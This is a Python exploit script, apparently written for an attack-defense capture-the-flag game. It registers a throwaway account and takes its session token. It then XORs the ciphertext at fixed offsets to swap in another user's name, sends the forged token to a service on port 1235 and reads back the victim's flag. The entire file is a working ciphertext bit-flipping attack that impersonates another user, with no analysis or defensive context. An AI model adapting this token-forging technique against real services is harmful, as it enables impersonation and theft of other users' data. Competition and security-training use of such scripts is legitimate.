#!/usr/bin/env python3

from pwn import *
from service2client import Client
from hashlib import sha256
import os
import sys
from Crypto.Cipher import AES

context.log_level = "error"

offset1 = 62
offset2 = 66


def exploit(ip, flag_id):
    admin_name = flag_id.encode()

    username = os.urandom(len(flag_id)).hex()[:len(flag_id)]
    password = os.urandom(6).hex()

    c = Client(ip, username, password, "1")
    c.register()

    c.login()
    token = c.get_token()

    t1, t2 = [bytes.fromhex(x) for x in token.split(".")]

    new_t1 = t1[:offset1] + xor(xor(t1[offset1:offset1+2*len(flag_id)], username.encode(
    ).hex().encode()), flag_id.encode().hex().encode()) + t1[offset1+2*len(flag_id):]
    new_t2 = t2[:offset2] + xor(xor(t2[offset2:offset2+2*len(flag_id)], username.encode(
    ).hex().encode()), flag_id.encode().hex().encode()) + t2[offset2+2*len(flag_id):]

    new_token = new_t1.hex().upper() + "." + new_t2.hex().upper()

    r = remote(ip, 1235)
    r.recvuntil(": ")
    r.sendline(new_token)
    r.recvuntil("Exit\n")
    r.sendline("3")
    r.recvuntil(": ")
    r.sendline("0")
    r.recvline()
    return r.recvline(False).split()[-1].decode()


if __name__ == "__main__":
    team_id = sys.argv[1]
    flag_id = sys.argv[2]
    ip = f"10.60.{team_id}.1"
    print(exploit(ip, flag_id))
